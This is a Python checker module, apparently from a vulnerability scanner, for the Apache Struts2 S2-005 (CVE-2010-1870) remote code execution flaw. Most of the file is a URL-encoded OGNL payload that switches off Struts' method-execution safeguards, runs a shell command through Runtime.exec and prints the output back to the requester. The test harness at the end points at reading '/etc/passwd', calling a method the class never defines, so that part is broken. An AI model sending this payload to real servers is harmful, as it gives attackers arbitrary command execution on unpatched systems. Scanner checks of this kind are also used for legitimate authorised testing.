#!/usr/bin/env python3

from app.lib.request import request
from app.lib.encode import urlencode
from app.lib.common import get_capta, get_useragent

class S2_005_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-005漏洞,又名CVE-2010-1870漏洞',
            'description': 'Struts2 S2-005漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.1.8.1',
            'date': '2010-08-15',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/example/HelloWorld.action'
        self.headers = {
            'User-Agent': get_useragent(),
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        self.capta = get_capta() 
        self.check_payload = '''?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27''' + urlencode(('echo' + ' ' + self.capta), 'utf-8') + '''%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29'''                    

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_req = await request.get(self.url + self.check_payload, headers = self.headers)
            result = await check_req.content.read(50)
            if result:
                if self.capta in result.decode(encoding='utf-8'):
                    return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_005 = S2_005_BaseVerify('http://localhost:8090/S2-005/')
    # print(S2_005.cmd('cat%20/etc/passwd'))
    print(S2_005.read('/etc/passwd'))
